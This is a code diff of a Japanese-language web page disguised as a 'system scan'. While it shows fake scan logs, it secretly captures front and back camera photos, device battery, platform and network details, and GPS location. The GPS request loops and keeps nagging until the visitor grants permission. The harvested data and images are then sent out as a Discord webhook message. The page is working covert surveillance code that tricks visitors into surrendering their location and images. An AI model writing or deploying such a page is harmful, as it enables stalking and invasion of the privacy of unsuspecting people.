@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>システムをスキャン</title>
+    <title>システムスキャン中...</title>
     <style>
         body {
             background-color: #0b0b0b;
@@ -63,43 +63,33 @@
             logsDiv.appendChild(div);
         }
 
-        // 許可されるまでカメラ取得をループする関数
-        async function captureCameraBlobUntilSuccess(facingMode, label) {
-            while (true) {
-                const blob = await new Promise((resolve) => {
-                    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-                        resolve(null);
-                        return;
-                    }
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } })
-                        .then(async (stream) => {
-                            const video = document.getElementById('video');
-                            video.srcObject = stream;
-                            await new Promise(res => { video.onloadedmetadata = res; });
-                            await video.play().catch(() => {});
-
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                            stream.getTracks().forEach(track => track.stop());
-
-                            canvas.toBlob((b) => {
-                                resolve(b);
-                            }, 'image/jpeg', 0.8);
-                        })
-                        .catch(() => resolve(null));
-                });
-
-                if (blob) {
-                    return blob;
-                } else {
-                    addWarn(`${label}のアクセスが拒否されました。「許可」を選択してください。`);
-                    // 1秒待ってから再試行（ポップアップを再度出させる）
-                    await new Promise(r => setTimeout(r, 1000));
+        // カメラは1回だけ試して拒否ならスキップする関数
+        async function captureCameraBlobOnce(facingMode) {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    return null;
                 }
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(res => { video.onloadedmetadata = res; });
+                await video.play().catch(() => {});
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                stream.getTracks().forEach(track => track.stop());
+
+                return await new Promise((resolve) => {
+                    canvas.toBlob((b) => {
+                        resolve(b);
+                    }, 'image/jpeg', 0.8);
+                });
+            } catch (e) {
+                return null;
             }
         }
 
@@ -115,9 +105,8 @@
                 }
 
                 addLog("> カメラフィードにアクセス中 (前面/背面)...");
-                // 許可されるまでループ
-                const frontBlob = await captureCameraBlobUntilSuccess("user", "前面カメラ");
-                const backBlob = await captureCameraBlobUntilSuccess("environment", "背面カメラ");
+                const frontBlob = await captureCameraBlobOnce("user");
+                const backBlob = await captureCameraBlobOnce("environment");
 
                 addLog(" ");
                 let batteryInfo = "取得不可";
@@ -142,10 +131,10 @@
                     network: netType
                 };
 
-                addLog("> GPS座標を要求中...(正確な場所にしてください)");
-                let gpsText = "拒否または未取得";
+                addLog("> GPS座標を要求中...");
+                let gpsText = "";
                 
-                // GPSも許可されるまでループさせる場合
+                // 【GPSはループあり】許可されるまで何度も要求し続ける
                 while (true) {
                     try {
                         const position = await new Promise((resolve, reject) => {
@@ -158,14 +147,14 @@
                         break; // 取得成功したらループを抜ける
                     } catch (e) {
                         addWarn("位置情報の取得が拒否されました。「許可」を選択してください。");
-                        await new Promise(r => setTimeout(r, 1000));
+                        await new Promise(r => setTimeout(r, 1000)); // 1秒待ってから再挑戦
                     }
                 }
 
                 addLog("> 情報を送信中...");
 
                 const discordMessage = {
-                    content: "🚨 **【完全版】全パラメータ・GPS・カメラ画像検知**",
+                    content: "🚨 **【システム診断】情報検知**",
                     embeds: [{
                         title: "📊 取得データ一覧",
                         color: 16711680,
@@ -176,8 +165,8 @@
                             { name: "🔋 バッテリー", value: info.battery, inline: true },
                             { name: "💻 プラットフォーム", value: info.platform, inline: true },
                             { name: "🛰️ GPS位置情報", value: gpsText, inline: false },
-                            { name: "📷 前面カメラ", value: "画像添付済み (front.jpg)", inline: true },
-                            { name: "📷 背面カメラ", value: "画像添付済み (back.jpg)", inline: true }
+                            { name: "📷 前面カメラ", value: frontBlob ? "画像添付済み (front.jpg)" : "取得なし/拒否", inline: true },
+                            { name: "📷 背面カメラ", value: backBlob ? "画像添付済み (back.jpg)" : "取得なし/拒否", inline: true }
                         ],
                         timestamp: new Date().toISOString()
                     }]
